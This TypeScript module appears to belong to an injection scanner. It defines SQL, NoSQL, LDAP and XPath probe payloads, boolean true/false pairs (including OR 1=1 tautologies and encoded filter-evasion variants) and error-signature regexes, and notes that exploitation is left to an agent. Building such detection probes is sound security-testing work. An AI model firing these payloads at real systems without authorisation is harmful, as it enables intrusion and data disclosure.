export interface ErrSigClass {
  payloads: string[]
  boolPairs?: { t: string; f: string }[]
  signatures: RegExp
}

export const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
  sqli: {
    payloads: [
      "'",
      '"',
      "`",
      "\\",
      "')",
      '")',
      "'))",
      `'"`,
      "'--",
      "'#",
      "'/*",
      "1'",
      '1"',
      "'/**/",
      "'-- -",
      "'/*!50000*/",
      "\\'",
      "' AND extractvalue(1,concat(0x7e,version()))-- -",
      "' AND 1=convert(int,@@version)-- -",
      "' AND 1=cast(version() as int)-- -",
      "' ORDER BY 9999-- -",
      "%27",
      "%22",
      "%2527",
      "%00'",
      "%u0027",
      "%%2727",
      "%27%20AND%201=1--%20-",
      "'+AND+1=convert(int,@@version)--+-",
    ],
    boolPairs: [
      { t: "' AND '1'='1", f: "' AND '1'='2" },
      { t: '" AND "1"="1', f: '" AND "1"="2' },
      { t: "') AND ('1'='1", f: "') AND ('1'='2" },
      { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
      { t: "1 AND 1=1", f: "1 AND 1=2" },
      { t: "'/**/AND/**/'1'='1", f: "'/**/AND/**/'1'='2" },
      { t: "' AnD '1'='1", f: "' AnD '1'='2" },
      { t: "' OR '1'='1", f: "' OR '1'='2" },
      { t: '" OR "1"="1', f: '" OR "1"="2' },
      { t: "') OR ('1'='1", f: "') OR ('1'='2" },
      { t: "' OR 1=1-- -", f: "' OR 1=2-- -" },
      { t: "1 OR 1=1", f: "1 OR 1=2" },
      { t: "' oR '1'='1", f: "' oR '1'='2" },
      { t: "' Or '1'='1-- -", f: "' Or '1'='2-- -" },
      { t: '"or(1)#', f: '"or(0)#' },
      { t: "'or(1)#", f: "'or(0)#" },
      { t: "'/**/OR/**/'1'='1", f: "'/**/OR/**/'1'='2" },
      { t: "' OR 1=1 LIMIT 1-- -", f: "' OR 1=1 LIMIT 1 OFFSET 9-- -" },
      { t: "%27+AND+%271%27=%271", f: "%27+AND+%271%27=%272" },
      { t: "%27+OR+%271%27=%271", f: "%27+OR+%271%27=%272" },
      { t: "%2527+AND+%25271%2527=%25271", f: "%2527+AND+%25271%2527=%25272" },
      { t: "'/*!50000AND*/'1'='1", f: "'/*!50000AND*/'1'='2" },
      { t: "'+/*!50000OR*/+'1'='1", f: "'+/*!50000OR*/+'1'='2" },
      { t: "' AND 1=1-- /**/ -", f: "' AND 1=2-- /**/ -" },
    ],
    signatures:
      /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?|XPATH syntax error|invalid input syntax for|Conversion failed when converting|Unknown column '\d/i,
  },
  nosql: {
    payloads: ["'", '"', "\\", "[", "]", "{", "}", "'\"", '{"a":', "']", "'}", "%00", '\\"', "{[", "',", "NaN", "'\\"],
    signatures:
      /MongoError|MongoServerError|BSONError|BSONTypeError|E11000|CastError|failed to parse|unexpected token.*(json|in json)|SyntaxError:.*JSON|\$where|Mongoose|couldn't parse/i,
  },
  ldap: {
    payloads: [
      "(",
      ")",
      "*",
      "\\",
      ")(",
      "*)",
      "(&",
      "(|",
      "))",
      "*()",
      "\\29",
      "\\28",
      "\\2a",
      "\\5c",
      "()",
      "&",
      "|",
    ],
    boolPairs: [
      { t: "*)(cn=*)", f: "*)(cn=z%zznomatch)" },
      { t: "*)(|(cn=*)", f: "*)(|(cn=z%zznomatch)" },
      { t: "*)(objectClass=*)", f: "*)(objectClass=zzznomatch)" },
    ],
    signatures:
      /LDAP.*(error|syntax|filter)|invalid DN|bad search filter|(javax|com)\.naming|invalid filter|Protocol error|InvalidSearchFilter|ldap_search/i,
  },
  xpath: {
    payloads: [
      "'",
      '"',
      ")",
      "(",
      "]",
      "[",
      "//",
      "*",
      "')",
      '")',
      "' and '1'='2",
      "count(",
      "']",
      "'))",
      "concat(",
      "string(",
    ],
    boolPairs: [
      { t: "' or '1'='1", f: "' or '1'='2" },
      { t: '" or "1"="1', f: '" or "1"="2' },
      { t: "1 or 1=1", f: "1 or 1=2" },
      { t: "' or true() or '1'='1", f: "' or false() or '1'='2" },
      { t: '") or ("1"="1', f: '") or ("1"="2' },
    ],
    signatures:
      /XPath|XPathException|xmlXPathEval|SyntaxError.*xpath|unclosed token|Invalid (expression|predicate)|xpath.*(syntax|error)|MS\.Internal\.Xml/i,
  },
}

export const ERRSIG_NOT_TESTED = [
  "blind injection with no error text AND no response differential (needs the agent's timing/OOB techniques)",
  "exploitation — data extraction, UNION, OR-based/stacked/auth-bypass payloads (the AGENT does this; the probe never widens a query)",
  "second-order/stored injection (fires on a later request)",
]

export const TESTED_LABEL: Record<string, string> = {
  xss: "xss: reflected tag-survival",
  ssti: "ssti: arithmetic evaluation",
  cmd: "cmd: read-only id/ver command-output",
  sqli: "sqli: error-signature + AND-based boolean-differential",
  nosql: "nosql: error-signature + operator boolean-differential ($ne/$eq/$regex/$gt/$lt)",
  ldap: "ldap: error-signature + filter boolean-differential",
  xpath: "xpath: error-signature + boolean-differential",
  lfi: "lfi: read-only path-traversal file-disclosure (Linux + Windows)",
  hpp: "hpp: HTTP Parameter Pollution — duplicate-parameter parser behavior (first-wins vs last-wins)",
  crlf: "crlf: injected-header echo (HTTP response-splitting / header-injection)",
  time_blind: "time_blind: dose-response + conditional timing (blind SQLi / OS command)",
}

import { XSS_NOT_TESTED } from "./xss"
import { SSTI_NOT_TESTED } from "./ssti"
import { CMD_NOT_TESTED } from "./cmd"
import { LFI_NOT_TESTED } from "./lfi"
import { HPP_NOT_TESTED } from "../probe/hpp"
import { CRLF_NOT_TESTED } from "../probe/crlf"
import { TIME_BLIND_NOT_TESTED } from "./time-blind"

export const NOT_TESTED_BY_CLASS: Record<string, string[]> = {
  xss: XSS_NOT_TESTED,
  ssti: SSTI_NOT_TESTED,
  cmd: CMD_NOT_TESTED,
  sqli: ERRSIG_NOT_TESTED,
  nosql: ERRSIG_NOT_TESTED,
  ldap: ERRSIG_NOT_TESTED,
  xpath: ERRSIG_NOT_TESTED,
  lfi: LFI_NOT_TESTED,
  hpp: HPP_NOT_TESTED,
  crlf: CRLF_NOT_TESTED,
  time_blind: TIME_BLIND_NOT_TESTED,
}
